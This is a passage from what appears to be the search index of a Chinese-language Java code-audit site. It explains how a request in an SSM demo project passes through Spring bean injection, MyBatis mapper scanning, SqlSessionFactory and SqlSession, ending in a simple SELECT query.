\u63a5\u53e3\uff0c\u67e5\u770b\u8be5\u63a5\u53e3\uff0c\u5982\u56fe</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u8be5\u63a5\u53e3\u4e2d\u5b9a\u4e49\u4e86 4 \u79cd\u65b9\u6cd5\uff0c\u4e3a\u4e86\u65b9\u4fbf\u7406\u89e3\uff0c\u8fd9\u4e9b\u65b9\u6cd5\u7684\u540d\u5b57\u5bf9\u5e94\u7740\u65e5\u5e38\u9879\u76ee\u4e2d\u5e38\u7528\u7684\u64cd\u4f5c\u6570\u636e\u5e93\u7684 4 \u4e2a\u65b9\u6cd5\uff0c\u5373\u589e\u3001\u5220\u3001\u6539\u3001\u67e5\u3002</p> <p>\u63a5\u4e0b\u6765\u67e5\u770b\u63a5\u53e3\u7684\u5b9e\u73b0\u7c7b BookServiceImpl\uff0c\u5982\u56fe</p> <p>\u5b9e\u73b0\u4e86 BookService \u63a5\u53e3\uff0c\u81ea\u7136\u4e5f\u9700\u8981\u5b9e\u73b0\u8be5\u63a5\u53e3\u4e0b\u7684\u6240\u6709\u65b9\u6cd5\uff0c\u627e\u5230queryAllBook \u65b9\u6cd5\uff0c\u53d1\u73b0 queryAllBook \u8c03\u7528\u4e86 bookMapper \u53c2\u6570\u7684 queryAllBook \u65b9\u6cd5\uff0c\u800c bookMapper \u662f BookMapper \u7c7b\u578b\u7684\u53c2\u6570\u3002</p> <p></p> <p>\u56de\u8fc7\u5934\u6765\u67e5\u770b spring-service.xml \u4e2d\u7684\u914d\u7f6e\u3002\u524d\u9762\u4ecb\u7ecd\u4e86\u8fd9\u4e00\u914d\u7f6e\u662f\u5c06BookServiceImpl \u7c7b\u751f\u6210\u4e00\u4e2a bean \u5e76\u653e\u5165 Spring \u7684 IoC \u5bb9\u5668\u4e2d\u3002\u6807\u7b7e\u7684\u610f\u601d\u662f\u901a\u8fc7\u8be5\u7c7b\u63d0\u4f9b\u7684 set \u65b9\u6cd5\u5728 bean \u751f\u6210\u65f6\u5411\u6307\u5b9a\u7684\u53c2\u6570\u6ce8\u5165 value\uff0cname \u5c5e\u6027\u5c31\u662f\u6307\u5b9a\u7684\u53c2\u6570\u7684\u540d\u79f0\u3002\u53ef\u4ee5\u770b\u5230 BookServiceImpl \u4e2d\u786e\u5b9e\u6709\u4e00\u4e2a\u79c1\u6709\u53c2\u6570\uff0c\u540d\u4e3abookMapper\uff0c\u5e76\u4e14\u63d0\u4f9b\u4e86\u8be5\u5c5e\u6027\u7684 set \u65b9\u6cd5\u3002ref \u5c5e\u6027\u662f\u6307\u8981\u6ce8\u5165\u7684 value \u662f\u5176\u4ed6\u7684Bean \u7c7b\u578b\uff0c\u5982\u679c\u4f20\u5165\u7684\u662f\u4e00\u4e9b\u57fa\u672c\u7c7b\u578b\u6216\u8005 String \u7c7b\u578b\uff0c\u5219\u4e0d\u9700\u8981\u4f7f\u7528 ref \uff0c\u53ea\u9700\u5c06 ref \u6539\u6210 value\uff0c\u5982\u56fe <p></p> <p>\u8fd9\u91cc\u901a\u8fc7 ref \u5c5e\u6027\u5411 BookServiceImpl \u7c7b\u4e2d\u7684 bookMapper \u53c2\u6570\u6ce8\u5165\u4e86\u4e00\u4e2a value\uff0c\u8fd9\u4e2a value \u662f\u4e00\u4e2a\u5176\u4ed6\u7684 bean \u7c7b\u578b\uff0c\u8be5 bean \u7684 id \u4e3a bookMapper\u3002\u6b64\u65f6 Service \u5c42\u7684BookServiceImpl \u7684 queryAllBook \u65b9\u6cd5\u7684\u5b9e\u73b0\u65b9\u5f0f\u5176\u5b9e\u5c31\u662f\u8c03\u7528\u4e86 id \u4e3a bookMapper\u7684 bean \u7684 queryAllBook \u65b9\u6cd5\uff0c\u56e0\u6b64\u8fd9\u4e2a id \u4e3a bookMapper \u7684 bean \u5c31\u662f\u7a0b\u5e8f\u6267\u884c\u7684\u4e0b\u4e00\u6b65\u3002</p> <p><code>&lt;bean id=\"userServiceimpl\" class=\"com.zc.Service.UserServiceimpl\"&gt;--&gt;   &lt;property name=\"UserMapper\" ref=\"userMapper\"/&gt;--&gt; &lt;/bean&gt;</code>\u4ee5\u4e0a\u4ee3\u7801\u5b9e\u73b0\u4e86\u4ec0\u4e48\u529f\u80fd\uff0c\u4e3e\u4f8b\u8bf4\u660e:</p> <p>\u8fd9\u6bb5\u4ee3\u7801\u662f\u4e00\u4e2a\u5178\u578b\u7684Spring\u914d\u7f6e\uff0c\u5b83\u5b9e\u73b0\u4e86\u5c06\u4e00\u4e2a\u540d\u4e3a\"userServiceimpl\"\u7684bean\u6ce8\u5165\u5230Spring\u5bb9\u5668\u4e2d\uff0c\u5e76\u6307\u5b9a\u4e86\u5b83\u7684\u7c7b\u4e3a\"com.zc.Service.UserServiceimpl\"\u3002\u540c\u65f6\uff0c\u901a\u8fc7\u5143\u7d20\uff0c\u5b83\u6ce8\u5165\u4e86\u4e00\u4e2a\u540d\u4e3a\"userMapper\"\u7684\u5c5e\u6027\uff0c\u5c5e\u6027\u503c\u662f\u53e6\u4e00\u4e2a\u5728Spring\u5bb9\u5668\u4e2d\u5b9a\u4e49\u7684bean\uff0c\u5176\u540d\u79f0\u4e3a\"userMapper\"\u3002property</p> <p>\u7b80\u5355\u6765\u8bf4\uff0c\u8fd9\u6bb5\u4ee3\u7801\u7684\u529f\u80fd\u662f\u5c06\u4e00\u4e2a\u540d\u4e3a\"userMapper\"\u7684bean\u6ce8\u5165\u5230\u540d\u4e3a\"userServiceimpl\"\u7684bean\u4e2d\u7684\"UserMapper\"\u5c5e\u6027\u4e2d\u3002\u8fd9\u901a\u5e38\u7528\u4e8e\u5b9e\u73b0\u4f9d\u8d56\u6ce8\u5165\uff0c\u5373\u5728\"UserServiceimpl\"\u7c7b\u4e2d\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\"userMapper\"\u8fd9\u4e2a\u5c5e\u6027\uff0c\u800c\u65e0\u9700\u5728\u7c7b\u5185\u90e8\u624b\u52a8\u521b\u5efa\u6216\u83b7\u53d6\"userMapper\"\u5bf9\u8c61\u3002</p> <pre><code>public class UserServiceimpl {\n    private UserMapper userMapper;\n// \u7701\u7565\u5176\u4ed6\u4ee3\u7801\npublic void setUserMapper(UserMapper userMapper) {\n    this.userMapper = userMapper;\n}\n// \u5176\u4ed6\u65b9\u6cd5\u4f7f\u7528\u4e86 userMapper\n</code></pre> <p>\u5728Spring\u7684\u914d\u7f6e\u6587\u4ef6\u4e2d\uff0c\u901a\u8fc7\u4ee5\u4e0a\u7684\u914d\u7f6e\uff0cSpring\u5bb9\u5668\u4f1a\u5b9e\u4f8b\u5316\u7c7b\uff0c\u5e76\u81ea\u52a8\u5c06\u540d\u4e3a\"userMapper\"\u7684bean\u6ce8\u5165\u5230\u5176\u5c5e\u6027\u4e2d\u3002\u8fd9\u6837\uff0c\u5728\u4e2d\u5c31\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u5c5e\u6027\u4e86\uff0c\u800c\u4e0d\u9700\u8981\u624b\u52a8\u521b\u5efa\u6216\u8005\u901a\u8fc7\u5176\u4ed6\u65b9\u5f0f\u83b7\u53d6\"userMapper\"\u5bf9\u8c61\u3002</p>"},{"location":"Code_audit/Java/Java-5/SSM/index.html#6ssm-mybatis","title":"6.SSM \u4e4b MyBatis \u6267\u884c\u6d41\u7a0b","text":"<p>\u63a5\u4e0b\u6765\u5c31\u662f Web \u4e09\u5c42\u67b6\u6784\u7684\u6570\u636e\u8bbf\u95ee\u5c42\uff0c\u4e5f\u5c31\u662f MyBaits \u8d1f\u8d23\u7684\u90e8\u5206\uff0c\u901a\u5e38\u8fd9\u4e00\u90e8\u5206\u7684\u5305\u540d\u53eb\u4f5c xxxdao\uff0c\u4e5f\u5c31\u662f\u5f00\u53d1\u8fc7\u7a0b\u4e2d\u7ecf\u5e38\u63d0\u53ca\u7684 DAO \u5c42\uff0c\u8be5\u5305\u4e0b\u9762\u7684\u7c7b\u548c\u63a5\u53e3\u901a\u5e38\u53eb\u4f5c xxxDao \u6216\u8005 xxxMapper\u3002\u6b64\u65f6\u7528\u6237\u7684\u8bf7\u6c42\u5c06\u4ece Spring \u8d1f\u8d23\u7684\u4e1a\u52a1\u5c42\u8fc7\u6e21\u5230 MyBatis \u8d1f\u8d23\u7684\u6570\u636e\u5c42\uff0c\u4f46\u662f MyBaits \u548c Spring \u4e4b\u95f4\u4e0d\u50cf Spring MVC \u548c Spring\u4e00\u6837\u53ef\u4ee5\u65e0\u7f1d\u8854\u63a5\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u901a\u8fc7\u914d\u7f6e\u6587\u4ef6\u5c06 MyBatis \u4e0e Spring \u5173\u8054\u8d77\u6765\u3002\u8fd9\u91cc\u6211\u4eec\u6765\u67e5\u770b\u4e00\u4e0b pom.xml\uff0c\u5982\u56fe</p> <p>1</p> <p>\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u5bfc\u5165\u7684\u5305\u9664\u4e86 MyBatis \u672c\u8eab\uff0c\u8fd8\u5bfc\u5165\u4e86\u4e00\u4e2a mybatis-spring \u5305\uff0c\u76ee\u7684\u5c31\u662f\u4e3a\u4e86\u6574\u5408 MyBatis \u548c Spring\u3002spring-dao.xml \u662f\u7528\u6765\u6574\u5408 Spring \u548c MyBatis \u7684\u914d\u7f6e\u6587\u4ef6\u3002</p> <p>\u521a\u624d\u6211\u4eec\u770b\u5230 Spring \u542f\u52a8\u52a0\u8f7d bean \u65f6\u4f1a\u6ce8\u5165\u4e00\u4e2a id \u4e3a bookMapper \u7684 bean\uff0c\u4f46\u662f\u6211\u4eec\u5e76\u672a\u5728\u4e4b\u524d\u7684\u4efb\u4f55\u914d\u7f6e\u6587\u4ef6\u5305\u62ec\u6ce8\u89e3\u4e2d\u770b\u5230\u8fd9\u4e2a bean \u7684\u76f8\u5173\u4fe1\u606f\uff0c\u6240\u4ee5\u6211\u4eec\u63a5\u4e0b\u6765\u8981\u67e5\u770b spring-dao.xml \u4e2d\u6709\u6ca1\u6709\u4e0e\u8fd9\u4e2a bean \u6709\u5173\u7684\u4fe1\u606f\uff0c\u5982\u56fe</p> <p></p> <p></p> <p>\u6bcf\u9879\u914d\u7f6e\u7684\u4f5c\u7528\u57fa\u672c\u90fd\u7528\u6ce8\u91ca\u7684\u65b9\u5f0f\u6807\u660e\u3002</p> <pre><code>&lt;context:property-placeholder location=\"classpath:database.properties\"/&gt;\n</code></pre> <p>\u8fd9\u91cc\u5173\u8054\u4e86\u4e00\u4e2a properties \u6587\u4ef6\uff0c\u5982\u56fe\u6240\u793a\uff0c\u91cc\u9762\u662f\u8fde\u63a5\u6570\u636e\u5e93\u548c\u914d\u7f6e\u8fde\u63a5\u6c60\u65f6\u9700\u8981\u7684\u4fe1\u606f\u3002</p> <p></p> <p>\u91cd\u70b9\u67e5\u770b\u8fd9\u4e2a\u914d\u7f6e\uff0c\u5982\u56fe</p> <p></p> <p>\u8be5\u914d\u7f6e\u901a\u8fc7\u751f\u6210 MapperScannerConfigurer \u7684 bean \u6765\u5b9e\u73b0\u81ea\u52a8\u626b\u63cf com.ssm_ project.dao \u4e0b\u9762\u7684\u63a5\u53e3\u5305\uff0c\u7136\u540e\u52a8\u6001\u6ce8\u5165 Spring IoC \u5bb9\u5668\u4e2d\uff0c\u540c\u6837\u52a8\u6001\u6ce8\u5165\u7684 bean\u7684 id \u9ed8\u8ba4\u4e3a\u7c7b\u540d\uff08\u5f00\u5934\u5b57\u6bcd\u5c0f\u5199\uff09\uff0c\u76ee\u5f55\u4e0b\u5305\u542b\u7684\u6587\u4ef6\u5982\u56fe</p> <p></p> <p>\u6211\u4eec\u770b\u5230\u6709\u4e00\u4e2a\u53eb\u4f5c BookMapper \u7684\u63a5\u53e3\u6587\u4ef6\uff0c\u8bf4\u660e\u4e4b\u524d\u751f\u6210 BookServiceImpl\u8fd9\u4e2a bean \u662f\u901a\u8fc7\uff08BookServiceImpl \u7c7b\u4e2d\u7684 setBookMapper()\u65b9\u6cd5\uff09\u6ce8\u5165\u7684bookMapper\uff0c\u662f\u7531\u6211\u4eec\u914d\u7f6e\u4e86 MapperScannerConfigurer \u8fd9\u4e2a bean \u540e\uff0c\u8fd9\u4e2a bean \u626b\u63cf dao \u5305\u4e0b\u7684\u63a5\u53e3\u6587\u4ef6\u5e76\u751f\u6210 bean\u3002\u7136\u540e\u518d\u6ce8\u5165 Spring \u7684 IoC \u5bb9\u5668\u4e2d\uff0c\u6240\u4ee5\u6211\u4eec\u624d\u53ef\u4ee5\u5728 BookServiceImpl \u8fd9\u4e2a bean \u4e2d\u901a\u8fc7\u6807\u7b7e\u6ce8\u5165 bookmapper \u8fd9\u4e2a bean\u3002 <pre><code>public void setBookMapper(BookMapper bookMapper) { \nthis.bookMapper = bookMapper; \n}\n</code></pre> <p>\u5982\u4f55\u7406\u89e3\u4e0a\u9762\u90a3\u6bb5\u8bdd\u7684\u610f\u601d\uff1f</p> <p>BookMapper\u63a5\u53e3\u6587\u4ef6\uff1a \u8fd9\u662f\u4e00\u4e2a\u63a5\u53e3\u6587\u4ef6\uff0c\u53ef\u80fd\u5b9a\u4e49\u4e86\u4e00\u7cfb\u5217\u64cd\u4f5c\u4e66\u7c4d\u76f8\u5173\u4fe1\u606f\u7684\u65b9\u6cd5\uff0c\u6bd4\u5982\u589e\u5220\u6539\u67e5\u7b49\u3002\u5b83\u5c5e\u4e8e\u6570\u636e\u8bbf\u95ee\u5c42\uff08DAO\uff09\uff0c\u7528\u4e8e\u4e0e\u6570\u636e\u5e93\u4ea4\u4e92\u3002</p> <p>BookServiceImpl bean\uff1a \u8fd9\u662f\u4e00\u4e2a\u670d\u52a1\u5c42\uff08Service\uff09\u7684bean\uff0c\u53ef\u80fd\u5305\u542b\u4e86\u4e00\u4e9b\u4e1a\u52a1\u903b\u8f91\uff0c\u6bd4\u5982\u5904\u7406\u56fe\u4e66\u4fe1\u606f\u7684\u589e\u5220\u6539\u67e5\u7b49\u3002\u5728\u8fd9\u6bb5\u63cf\u8ff0\u4e2d\uff0c\u63d0\u5230\u4e86BookServiceImpl bean\u662f\u901a\u8fc7\u6ce8\u5165bookMapper\u5c5e\u6027\u6765\u5b9e\u73b0\u5bf9\u6570\u636e\u8bbf\u95ee\u5c42\u7684\u64cd\u4f5c\u7684\u3002</p> <p>bookMapper\u5c5e\u6027\u6ce8\u5165\uff1a \u5728BookServiceImpl\u7c7b\u4e2d\uff0c\u53ef\u80fd\u6709\u4e00\u4e2a\u540d\u4e3asetBookMapper\u7684\u65b9\u6cd5\uff0c\u7528\u4e8e\u6ce8\u5165BookMapper\u5b9e\u4f8b\u3002\u8fd9\u662f\u901a\u8fc7Spring\u7684\u4f9d\u8d56\u6ce8\u5165\u529f\u80fd\u5b9e\u73b0\u7684\u3002\u4e5f\u5c31\u662f\u8bf4\uff0cBookServiceImpl\u7c7b\u4f1a\u4eceSpring\u5bb9\u5668\u4e2d\u83b7\u53d6BookMapper\u7684\u5b9e\u4f8b\uff0c\u5e76\u5c06\u5176\u6ce8\u5165\u5230setBookMapper\u65b9\u6cd5\u4e2d\u3002</p> <p>MapperScannerConfigurer bean\u914d\u7f6e\uff1a \u5728Spring\u7684\u914d\u7f6e\u6587\u4ef6\u4e2d\uff0c\u53ef\u80fd\u6709\u4e00\u4e2a\u540d\u4e3aMapperScannerConfigurer\u7684bean\u914d\u7f6e\uff0c\u5b83\u4f1a\u626b\u63cf\u6307\u5b9a\u5305\u4e0b\u7684\u63a5\u53e3\u6587\u4ef6\uff0c\u5982DAO\u63a5\u53e3\u6587\u4ef6\uff0c\u5e76\u5c06\u5176\u6ce8\u518c\u4e3abean\u3002\u8fd9\u6837\uff0cBookMapper\u63a5\u53e3\u6587\u4ef6\u5c31\u4f1a\u88ab\u626b\u63cf\u5e76\u6ce8\u518c\u4e3a\u4e00\u4e2aSpring bean\u3002</p> <p>IoC\u5bb9\u5668\u4e2d\u7684\u7ba1\u7406\uff1a \u901a\u8fc7\u4e0a\u8ff0\u914d\u7f6e\uff0cSpring\u5bb9\u5668\u4f1a\u7ba1\u7406BookMapper\u5b9e\u4f8b\u548cBookServiceImpl\u5b9e\u4f8b\u3002BookMapper\u5b9e\u4f8b\u4f1a\u88abMapperScannerConfigurer\u626b\u63cf\u5e76\u6ce8\u518c\u5230\u5bb9\u5668\u4e2d\uff0c\u800cBookServiceImpl\u5b9e\u4f8b\u4f1a\u901a\u8fc7\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u6807\u7b7e\u6ce8\u5165bookMapper\u5b9e\u4f8b\uff0c\u4f7f\u5f97BookServiceImpl\u53ef\u4ee5\u4f7f\u7528BookMapper\u63d0\u4f9b\u7684\u6570\u636e\u8bbf\u95ee\u529f\u80fd\uff0c\u800c\u4e0d\u9700\u8981\u76f4\u63a5\u4f9d\u8d56\u4e8e\u5177\u4f53\u7684\u6570\u636e\u8bbf\u95ee\u5b9e\u73b0\u3002 <p>\u7136\u540e\u67e5\u770b\u8be5\u914d\u7f6e\uff0c\u5982\u56fe</p> <p></p> <p>\u8fd9\u91cc\u751f\u6210\u4e00\u4e2a id \u4e3a SqlSessionFactory \u7684 bean\uff0c\u6d89\u53ca MyBatis \u4e2d\u7684\u4e24\u4e2a\u5173\u952e\u5bf9\u8c61\u5373 SqlSessionFactory \u548c SqlSession\u3002</p> <p>\u4e24\u4e2a\u5bf9\u8c61\u7b80\u5355\u4ecb\u7ecd\u5982\u4e0b\u3002</p>"},{"location":"Code_audit/Java/Java-5/SSM/index.html#1sqlsessionfactory","title":"\uff081\uff09SqlSessionFactory\u3002","text":"<p>SqlSessionFactory \u662f MyBatis \u7684\u5173\u952e\u5bf9\u8c61\uff0c\u5b83\u662f\u5355\u4e2a\u6570\u636e\u5e93\u6620\u5c04\u5173\u7cfb\u7ecf\u8fc7\u7f16\u8bd1\u540e\u7684\u5185\u5b58\u955c\u50cf\u3002SqlSessionFactory \u5bf9\u8c61\u7684\u5b9e\u4f8b\u53ef\u4ee5\u901a\u8fc7 SqlSessionBuilder \u5bf9\u8c61\u83b7\u5f97\uff0c\u800cSqlSessionBuilder \u5219\u53ef\u4ee5\u4ece xml \u914d\u7f6e\u6587\u4ef6\u6216\u4e00\u4e2a\u9884\u5148\u5b9a\u5236\u7684 Configuration \u7684\u5b9e\u4f8b\u6784\u5efa\u51fa SqlSessionFactory \u7684\u5b9e\u4f8b\u3002SqlSessionFactory \u662f\u521b\u5efa SqlSession \u7684\u5de5\u5382</p>"},{"location":"Code_audit/Java/Java-5/SSM/index.html#2sqlsession","title":"\uff082\uff09SqlSession\u3002","text":"<p>SqlSession \u662f\u6267\u884c\u6301\u4e45\u5316\u64cd\u4f5c\u7684\u5bf9\u8c61\uff0c\u7c7b\u4f3c\u4e8e JDBC \u4e2d\u7684 Connection\u3002\u5b83\u662f\u5e94\u7528\u7a0b\u5e8f\u4e0e\u6301\u4e45\u5b58\u50a8\u5c42\u4e4b\u95f4\u6267\u884c\u4ea4\u4e92\u64cd\u4f5c\u7684\u4e00\u4e2a\u5355\u7ebf\u7a0b\u5bf9\u8c61\u3002SqlSession \u5bf9\u8c61\u5b8c\u5168\u5305\u62ec\u4ee5\u6570\u636e\u5e93\u4e3a\u80cc\u666f\u7684\u6240\u6709\u6267\u884c SQL \u64cd\u4f5c\u7684\u65b9\u6cd5\uff0c\u5b83\u7684\u5e95\u5c42\u5c01\u88c5\u4e86 JDBC \u8fde\u63a5\uff0c\u53ef\u4ee5\u7528SqlSession \u5b9e\u4f8b\u6765\u76f4\u63a5\u6267\u884c\u5df2\u6620\u5c04\u7684 SQL \u8bed\u53e5\u3002</p> <p>SqlSessionFactory \u548c SqlSession \u7684\u5b9e\u73b0\u8fc7\u7a0b\u5982\u4e0b\u3002 MyBatis \u6846\u67b6\u4e3b\u8981\u662f\u56f4\u7ed5\u7740 SqlSessionFactory \u8fdb\u884c\u7684\uff0c\u5b9e\u73b0\u8fc7\u7a0b\u5927\u6982\u5982\u4e0b\u3002</p> <ul> <li>\u5b9a\u4e49\u4e00\u4e2a Configuration \u5bf9\u8c61\uff0c\u5176\u4e2d\u5305\u542b\u6570\u636e\u6e90\u3001\u4e8b\u52a1\u3001mapper \u6587\u4ef6\u8d44\u6e90\u4ee5\u53ca\u5f71\u54cd\u6570\u636e\u5e93\u884c\u4e3a\u5c5e\u6027\u8bbe\u7f6e settings\u3002</li> <li>\u901a\u8fc7\u914d\u7f6e\u5bf9\u8c61\uff0c\u5219\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a SqlSessionFactoryBuilder \u5bf9\u8c61\u3002</li> <li>\u901a\u8fc7 SqlSessionFactoryBuilder \u83b7\u5f97 SqlSessionFactory \u7684\u5b9e\u4f8b\u3002</li> <li>SqlSessionFactory \u7684\u5b9e\u4f8b\u53ef\u4ee5\u83b7\u5f97\u64cd\u4f5c\u6570\u636e\u7684 SqlSession \u5b9e\u4f8b\uff0c\u901a\u8fc7\u8fd9\u4e2a\u5b9e\u4f8b\u5bf9\u6570\u636e\u5e93\u8fdb\u884c\u3002</li> </ul> <p>\u5982\u679c\u662f Spring \u548c MyBaits \u6574\u5408\u4e4b\u540e\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u4e00\u822c\u4ee5\u8fd9\u79cd\u65b9\u5f0f\u5b9e\u73b0SqlSessionFactory \u7684\u521b\u5efa\uff0c\u793a\u4f8b\u4ee3\u7801\u5982\u4e0b\u3002</p> <pre><code>&lt;bean id=\"sqlSessionFactory\"class=\"org.mybatis.spring. \nSqlSessionFactoryBean\"&gt; \n&lt;property name=\"dataSource\" ref=\"dataSource\"&gt;&lt;/property&gt; \n&lt;property name=\"mapperLocations\" value=\"classpath:com/cn/mapper/*.xml\"&gt; \n&lt;/property&gt; \n&lt;/bean&gt;}\n</code></pre> <p>SqlSessionFactoryBean \u662f\u4e00\u4e2a\u5de5\u5382 Bean\uff0c\u6839\u636e\u914d\u7f6e\u6765\u521b\u5efa SqlSessionFactory\u3002\u624b\u52a8\u521b\u5efa SqlSessionFactory \u548c SqlSession \u7684\u6d41\u7a0b\u5982\u56fe</p> <p></p> <p>\u6211\u4eec\u540c\u65f6\u6ce8\u610f\u5230\u6807\u7b7e\u7684 value \u5c5e\u6027\u662f\u201cclasspath:mybatis-config.xml\u201d\uff0c\u8fd9\u91cc\u53c8\u5f15\u5165\u4e86\u4e00\u4e2a xml \u914d\u7f6e\u6587\u4ef6\uff0c\u5373 mybatis-config.xml\uff0c\u662f MyBatis \u7684\u914d\u7f6e\u6587\u4ef6\u3002 <p></p> <p>\u7a0b\u5e8f\u521a\u624d\u6267\u884c\u5230 BookServiceImpl \u7c7b\u7684 queryAllBook \u65b9\u6cd5\uff0c\u7136\u540e\u8be5\u65b9\u6cd5\u53c8\u8c03\u7528\u4e86bookMapper \u7684 queryAllBook \u65b9\u6cd5\u3002\u6211\u4eec\u53d1\u73b0 bookMapper \u7684\u7c7b\u578b\u662f BookMapper\uff0c\u5e76\u4e14\u4ece sping-dao.xml \u7684\u914d\u7f6e\u6587\u4ef6\u4e2d\u770b\u5230\u4e86\u8be5\u6587\u4ef6\u4f4d\u4e8e com.ssm_project.dao \u8def\u5f84\u4e0b\u3002\u73b0\u5728\u6253\u5f00 BookMapper.java \u6587\u4ef6\u8fdb\u884c\u67e5\u770b\uff0c\u5982\u56fe</p> <p></p> <p>\u6211\u4eec\u6ce8\u610f\u5230\u8fd9\u53ea\u662f\u4e00\u4e2a\u63a5\u53e3\uff0c\u4f17\u6240\u5468\u77e5\uff0c\u63a5\u53e3\u4e0d\u80fd\u8fdb\u884c\u5b9e\u4f8b\u5316\uff0c\u53ea\u662f\u63d0\u4f9b\u4e00\u4e2a\u89c4\u8303\uff0c\u56e0\u6b64\u8fd9\u91cc\u7684\u95ee\u9898\u662f\u8c03\u7528\u7684 BookMapper \u7684 queryAllBook \u662f\u600e\u6837\u6267\u884c\u7684\uff1f</p> <p>\u4ed4\u7ec6\u67e5\u770b dao \u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\uff0c\u5982\u56fe</p> <p></p> <p>\u5176\u4e2d\u6709\u4e00\u4e2a\u540d\u79f0\u4e0e BookMapper.java \u540d\u79f0\u76f8\u540c\u7684 xml \u6587\u4ef6\uff0c\u5176\u5185\u5bb9\u5982\u56fe</p> <p></p> <p>\u770b\u5230\u8fd9\u4e2a\u6587\u4ef6\uff0c\u867d\u7136\u6211\u4eec\u5bf9 MyBatis \u7684\u4e86\u89e3\u5e76\u4e0d\u591a\uff0c\u4f46\u662f\u53ef\u4ee5\u5927\u6982\u4e86\u89e3\u4e3a\u4ec0\u4e48BookMapper \u660e\u660e\u53ea\u662f\u63a5\u53e3\uff0c\u6211\u4eec\u5374\u53ef\u4ee5\u5b9e\u4f8b\u5316\u751f\u6210 BookMapper \u7684 bean\uff0c\u5e76\u4e14\u53ef\u4ee5\u8c03\u7528\u5b83\u7684\u65b9\u6cd5\u3002</p> <p>\u4f46\u662f BookMapper.java \u548c BookMapper.xml \u663e\u7136\u4e0d\u662f MyBatis \u7684\u5168\u90e8\uff0c\u4e24\u4e2a\u6587\u4ef6\u4e4b\u95f4\u6b64\u65f6\u9664\u4e86\u540d\u5b57\u76f8\u540c\u4ee5\u5916\u8fd8\u6ca1\u6709\u4ec0\u4e48\u76f4\u63a5\u8054\u7cfb\uff0c\u6240\u4ee5\u6211\u4eec\u8fd8\u9700\u8981\u5c06\u5b83\u4eec\u5173\u8054\u8d77\u6765\u3002\u67e5\u770b mybatis-config.xml \u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u5982\u56fe</p> <p></p> <p>\u53ef\u4ee5\u53d1\u73b0<code>&lt;mappers&gt;</code>\u6807\u7b7e\u7684 resource \u5c5e\u6027\u7684 value \u5c31\u662f <code>BookMapper.xml</code>\u7684\u8def\u5f84MyBatis\uff0c\u662f\u57fa\u4e8e SQL \u6620\u5c04\u914d\u7f6e\u7684\u6846\u67b6\u3002SQL \u8bed\u53e5\u90fd\u5199\u5728 Mapper \u914d\u7f6e\u6587\u4ef6\u4e2d\uff0c\u6784\u5efa SqlSession \u7c7b\u540e\uff0c\u9700\u8981\u53bb\u8bfb\u53d6 Mapper \u914d\u7f6e\u6587\u4ef6\u4e2d\u7684 SQL \u914d\u7f6e\u3002\u800c<code>&lt;mappers&gt;</code>\u6807\u7b7e\u5c31\u662f\u7528\u6765\u914d\u7f6e\u9700\u8981\u52a0\u8f7d\u7684 SQL \u6620\u5c04\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\u7684\u3002</p> <p>\u4e5f\u5c31\u662f\u8bf4\uff0c\u6700\u7ec8\u7531 Spring \u751f\u6210 BookMapper \u7684\u4ee3\u7406\u5bf9\u8c61\uff0c\u7136\u540e\u7531 MyBaits \u901a\u8fc7<code>&lt;mappers&gt;</code>\u6807\u7b7e\u5c06BookMapper\u4ee3\u7406\u5bf9\u8c61\u4e2d\u7684\u65b9\u6cd5\u4e0eBookMapper.xml\u4e2d\u7684\u914d\u7f6e\u8fdb\u884c\u4e00\u4e00\u6620\u5c04\uff0c\u5e76\u6700\u7ec8\u6267\u884c\u5176\u4e2d\u7684 SQL \u8bed\u53e5\u3002</p> <p>\u53ef\u4ee5\u53d1\u73b0\u6b64\u6b21\u8bf7\u6c42\u6700\u7ec8\u8c03\u7528\u4e86 BookMapper \u7684 queryAllBook \u65b9\u6cd5\uff0c\u8fd9\u65f6\u6211\u4eec\u9700\u8981\u53bb BookMapper.xml \u4e2d\u5bfb\u627e\u4e0e\u4e4b\u5bf9\u5e94\u7684 SQL \u8bed\u53e5\uff0c\u5982\u56fe</p> <p></p> <p>\u6211\u4eec\u770b\u5230\u6700\u540e\u6267\u884c\u7684 SQL \u8bed\u53e5\u5982\u4e0b\u3002</p> <pre><code>SELECT * from ssmbuild.books\n</code></pre> <p>\u81f3\u6b64\u6211\u4eec\u7684\u8bf7\u6c42\u5df2\u7ecf\u5b8c\u6210\uff0c\u4ece\u4e00\u5f00\u59cb\u7684\u7531 DispatcherServlet \u524d\u7aef\u63a7\u5236\u5668\u6d3e\u53d1\u7ed9Spring MVC\uff0c\u5e76\u6700\u7ec8\u901a\u8fc7 MyBatis \u6267\u884c\u6211\u4eec\u9700\u8981\u5bf9\u6570\u636e\u5e93\u8fdb\u884c\u7684\u64cd\u4f5c\u3002</p> <p>\u751f\u4ea7\u73af\u5883\u7684\u4e1a\u52a1\u4ee3\u7801\u80af\u5b9a\u4f1a\u6bd4\u8fd9\u4e2a DEMO \u590d\u6742\uff0c\u4f46\u662f\u6574\u4f53\u7684\u6267\u884c\u6d41\u7a0b\u548c\u601d\u8def\u5e76\u4e0d\u4f1a\u6709\u592a\u5927\u7684\u53d8\u5316\uff0c\u6240\u4ee5\u5ba1\u8ba1\u601d\u8def\u4e5f\u662f\u5982\u6b64\u3002</p> <p>SSM \u6846\u67b6\u6709 3 \u79cd\u914d\u7f6e\u65b9\u5f0f\uff0c\u5373\u5168\u5c40\u91c7\u7528 xml \u914d\u7f6e\u6587\u4ef6\u7684\u5f62\u5f0f\uff0c\u5168\u5c40\u91c7\u53d6\u6ce8\u89e3\u7684\u914d\u7f6e\u65b9\u5f0f\uff0c\u6216\u8005\u6ce8\u89e3\u4e0e xml \u914d\u7f6e\u6587\u4ef6\u914d\u5408\u4f7f\u7528\u7684\u65b9\u5f0f\uff0c\u533a\u522b\u53ea\u662f\u5728\u4e8e\u5199\u6cd5\u4e0d\u540c\uff0c\u6267\u884c\u6d41\u7a0b\u4e0d\u4f1a\u56e0\u6b64\u53d1\u751f\u592a\u591a\u6539\u53d8\u3002</p>"},{"location":"Code_audit/Java/Java-5/Spring%20Boot/index.html","title":"Java EE 